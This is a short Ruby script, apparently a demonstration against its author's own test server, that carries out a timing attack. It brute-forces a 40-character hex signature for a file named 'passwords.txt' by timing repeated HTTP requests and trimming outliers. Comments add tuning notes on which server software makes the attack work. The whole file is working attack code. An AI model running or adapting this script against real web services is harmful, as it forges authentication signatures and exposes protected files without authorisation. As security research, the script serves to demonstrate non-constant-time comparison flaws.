#!/usr/bin/env ruby
#technion@lolware.net
#Interesting fact: even with the artificial delay turned up to 500ms,
#WEBrick performance was too inconsistent for this to work.
#Server must run Unicorn or similar.
#Start time: 0.3s
#Replace Time.now with absolute_time gem: 0.1s
#Introduce loop and trimming

require 'net/http'
require 'absolute_time'
class Array
    def sum
        self.inject{|sum,x| sum + x }
    end
end

uri = URI('http://lolware.net:3000')

#Test, working URI:
#http://lolware.net:3000/?filename=passwords.txt&signature=584d58d79bbd58242a343aa5bf3d7a3dcf8a5a1a

key = 'A' * 40 #initial string of correct size
#First query - throwaway key. Ramps up service.
params = { :filename => 'passwords.txt', :signature => key }
uri.query = URI.encode_www_form(params)
res = Net::HTTP.get_response(uri)

(0..key.length-1).each { |n|
    delta = 0.to_f  
    winning = 0 #Unused value to delcare outside loop
    (0..15).each { |a| #Test each hex character
        key[n] = a.to_s(16)
        puts key
        params = { :filename => 'passwords.txt', :signature => key }
        uri.query = URI.encode_www_form(params)
        t = []
        20.times {
            t.push ( AbsoluteTime.realtime {
                Net::HTTP.get_response(uri)
            } )
        }

        #Trim outliers - four max and min
        4.times { t.delete(t.max) }
        4.times { t.delete(t.min) }

        if t.sum > delta
            delta = t.sum
            winning = a
        end
        #puts "Query took #{Time.now - t} seconds"
        #puts res.body if res.is_a?(Net::HTTPSuccess)
    }
    puts "Winning value is #{winning}"
    key[n] = winning.to_s(16)
}

puts "VALID KEY IS: #{key} "

